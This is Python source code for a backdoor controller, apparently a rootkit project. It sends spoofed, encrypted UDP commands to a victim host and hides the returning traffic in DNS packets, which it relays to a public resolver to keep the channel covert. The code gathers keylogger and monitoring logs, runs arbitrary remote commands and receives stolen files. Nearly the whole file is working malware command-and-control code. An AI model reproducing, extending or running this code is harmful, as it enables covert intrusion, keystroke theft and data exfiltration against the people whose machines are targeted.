"""
    This is the backdoor controller program.
    It allows you to control the backdoor on a victim host
    by sending it different commands over a network.
"""

# Ignore warnings
from warnings import filterwarnings
filterwarnings("ignore")

# Standard Library Modules
import argparse
from multiprocessing import Process, SimpleQueue
from ipaddress import ip_address, IPv6Address
from sys import exit, maxsize
from time import sleep

# Custom Modules
from utils.shell import *
from utils.encryption import *
from utils.validation import validate_ipv4_address, validate_nic_interface

# Third Party Libraries
from scapy.all import IP, sr1, UDP, send, sniff, Raw, DNS, conf

# Command Line Arguments
PARSER = argparse.ArgumentParser("./main.py")
PARSER.add_argument("controller_ip", help="The IPv4 address of the controller host")
PARSER.add_argument("rootkit_ip", help="The IPv4 address of the rootkit host.")
PARSER.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
ARGS = PARSER.parse_args()

# Manually set scapy to use libpcap.
conf.use_pcap = True

# Validate Arguments
if not validate_ipv4_address(ARGS.controller_ip):
    print(f"Invalid IPv4 Address: '{ARGS.controller_ip}'")
    exit(1)

if not validate_ipv4_address(ARGS.rootkit_ip):
    print(f"Invalid IPv4 Address: '{ARGS.rootkit_ip}'")
    exit(1)

if not validate_nic_interface(ARGS.interface):
    print(f"Network Interface does not exist: '{ARGS.interface}'")
    exit(1)


# Global Variables
CONTROLLER_IP = ARGS.controller_ip
ROOTKIT_IP = ARGS.rootkit_ip
NETWORK_INTERFACE = ARGS.interface
QUEUE = SimpleQueue()
COMMAND_OUTPUT_QUEUE = SimpleQueue()
FILE_DATA_QUEUE = SimpleQueue()
STREAM_ENCRYPTION_HANDLER = StreamEncryption()
BLOCK_ENCRYPTION_HANDLER = BlockEncryption()
MONITOR_IDENTIFICATION = 14562
KEYLOG_IDENTIFICATION = 32586
GENERAL_MSG_IDENTIFICATION = 19375
COMMAND_OUTPUT_IDENTIFICATION = 51486
FILE_TRANSFER_IDENTIFICATION = 39182


# Initialize the encryption context.
STREAM_ENCRYPTION_HANDLER.read_nonce("data/nonce.bin")
STREAM_ENCRYPTION_HANDLER.read_secret("data/secret.key")
STREAM_ENCRYPTION_HANDLER.initialize_encryption_context()
BLOCK_ENCRYPTION_HANDLER.read_key("data/fernet.key")


def relay_dns_query(pkt):
    forged = IP(dst="8.8.8.8")/UDP(sport=53, dport=53)/DNS(rd=1, qd=pkt[DNS].qd)
    response = sr1(forged, verbose=0)
    response[IP].src = f"{CONTROLLER_IP}"
    response[IP].dst = f"{ROOTKIT_IP}"
    send(response, verbose=0)


def subprocess_packet_handler(pkt):
    """
    
    """
    if pkt[UDP].sport != 53 or pkt[UDP].dport != 53:
        return None
    encrypted_message = pkt[UDP].ar.rdata[0]
    if pkt[IP].id == GENERAL_MSG_IDENTIFICATION:
        QUEUE.put(encrypted_message)
        relay_dns_query(pkt)
    if pkt[IP].id == KEYLOG_IDENTIFICATION:
        write_keylog_data(encrypted_message)
    if pkt[IP].id == MONITOR_IDENTIFICATION:
        write_monitor_data(encrypted_message)
    if pkt[IP].id == COMMAND_OUTPUT_IDENTIFICATION:
        COMMAND_OUTPUT_QUEUE.put(encrypted_message)
    if pkt[IP].id == FILE_TRANSFER_IDENTIFICATION:
        FILE_DATA_QUEUE.put(encrypted_message)


def write_keylog_data(data):
    b = BLOCK_ENCRYPTION_HANDLER.decrypt(data)
    msg = b.decode("utf-8")
    with open("logs/keylogger.log", "a") as f:
        f.write(msg)


def write_monitor_data(data):
    b = BLOCK_ENCRYPTION_HANDLER.decrypt(data)
    msg = b.decode("utf-8")
    with open("logs/monitor.log", "a") as f:
        f.write(msg)


def subprocess_start():
    """
    """
    sniff(filter=f"ip src host {ROOTKIT_IP} and not port ssh and udp and not icmp", iface=f"{NETWORK_INTERFACE}", prn=subprocess_packet_handler)


def send_udp(data: str):
    """
        Sends a UDP packet to the backdoor which is supposed to contain a command.
        All commands get sent to a specific UDP port on the backdoor machine.
        The UDP packet that is sent contains the encrypted command in the payload
        section. The backdoor machine listens for a specific port to know that
        the UDP packet is ours.
    """
    data = data.encode("utf-8")
    # Encrypt the data.
    data = STREAM_ENCRYPTION_HANDLER.encrypt(data)
    # Forge the UDP packet.
    pkt = IP(src=f"{CONTROLLER_IP}", dst=f"{ROOTKIT_IP}")/UDP(sport=10069, dport=10420, len=len(data))
    pkt[UDP].payload = Raw(data)
    # Send the packet.
    send(pkt, verbose=0)


def receive_single_response():
    attempts = 0
    while attempts < 3:
        if QUEUE.empty():
            attempts += 1
            sleep(1)
            continue
        else:
            encrypted = QUEUE.get()
            decrypted = STREAM_ENCRYPTION_HANDLER.decrypt(encrypted)
            print(f"Response: {decrypted.decode('utf-8')}")
            return
    print("Timed out waiting for response...")


def receive_command_output():
    attempts = 0
    bytes_received = 0
    bytes_expected = maxsize
    command_output = ""
    while attempts < 3 and bytes_received < bytes_expected:
        if COMMAND_OUTPUT_QUEUE.empty():
            attempts += 1
            sleep(1)
            continue
        else:
            encrypted = COMMAND_OUTPUT_QUEUE.get()
            decrypted = BLOCK_ENCRYPTION_HANDLER.decrypt(encrypted)
            bytes_received += len(decrypted)
            decrypted = decrypted.decode("utf-8")
            attempts = 0
            if "NUM_BYTES:" in decrypted:
                parts = decrypted.split(" ")
                parts = parts[0].split(":")
                bytes_expected = int(parts[1])
                decrypted = decrypted.replace(f"NUM_BYTES:{str(bytes_expected)} ", "")
            command_output += decrypted
    if attempts == 3:
        print("Timed out waiting for response...")
    else:
        print(command_output)


def receive_file_transfer():
    attempts = 0
    bytes_received = 0
    bytes_expected = maxsize
    file_bytes = b''
    while attempts < 3 and bytes_received < bytes_expected:
        if FILE_DATA_QUEUE.empty():
            attempts += 1
            sleep(1)
            continue
        else:
            encrypted = FILE_DATA_QUEUE.get()
            decrypted = BLOCK_ENCRYPTION_HANDLER.decrypt(encrypted)
            bytes_received += len(decrypted)
            attempts = 0
            if b'NUM_BYTES:' in decrypted or b'FILENAME:' in decrypted:
                parts = decrypted.split(b' ')
                filename = parts[0].split(b':')[1].encode()
                bytes_expected = int(parts[1].split(b':')[1].encode("utf-8"))
                continue
            file_bytes += decrypted
    if attempts == 3:
        print("Timed out waiting for response...")
    else:
        # Save the file.
        new_filename_found = False
        while not new_filename_found:
            if os.path.exists(f"downloads/{filename}"):
                filename = increment_version(filename)
            else:
                new_filename_found = True
                with open(f"downloads/{filename}") as f:
                    f.write(file_bytes)
                print("File saved successfully.")


def increment_version(filename):
    filename_no_extension = ""
    extension = ""
    index = 0
    for i in range(0, len(filename)):
        if filename[i] == ".":
            filename_no_extension = filename[0:i]
            extension = filename[i:]
            break
        else:
            filename_no_extension += filename[i]
    version = 0
    parts = filename_no_extension.split("-")
    x = len(parts)
    try:
        version = int(parts[x-1])
    except ValueError:
        pass
    if version != 0:
        new_filename = filename_no_extension.replace(f"-{version}", f"-{version+1}")
    else:
        new_filename = filename_no_extension + f"-{version+1}"
    print(new_filename)
    return new_filename + extension


def arg_list_to_string(args: list):
    result = ""
    for arg in args:
        result += arg
        result += " "
    result = result.strip()
    return result


if __name__ == "__main__":

    # Start the secondary process which sniffs for DNS requests from the backdoor,
    # decodes the attached information, and forwards the DNS request to a legitimate server,
    # then forwards the legitmate response back to the backdoor.
    decode_process = Process(target=subprocess_start)
    decode_process.start()

    # Interactive Shell
    print_menu()
    while True:
        try:
            command = input("λ: ")
        except KeyboardInterrupt:
            break
        argv = command.split(" ")
        argc = len(argv)
        if argc == 1:
            if command == HELP:
                print_help()
                continue
            elif command == CLEAR:
                clear_screen()
                continue
            elif command == EXIT:
                break
        if argc == 2:
            data = argv[0] + " " + argv[1]
            if argv[0] == KEYLOGGER:
                if argv[1] in [START, STOP, TRANSFER]:
                    send_udp(data)
                    receive_single_response()
                continue
            if argv[0] == WATCH:
                send_udp(data)
                receive_single_response()
                continue
            if argv[0] == STEAL:
                send_udp(data)
                receive_single_response()
                continue
        if argv[0] == EXECUTE:
            data = argv[0] + " " + arg_list_to_string(argv[1:])
            send_udp(data)
            receive_command_output()
        else:
            print(f"Invalid Command: {command}")
    decode_process.kill()
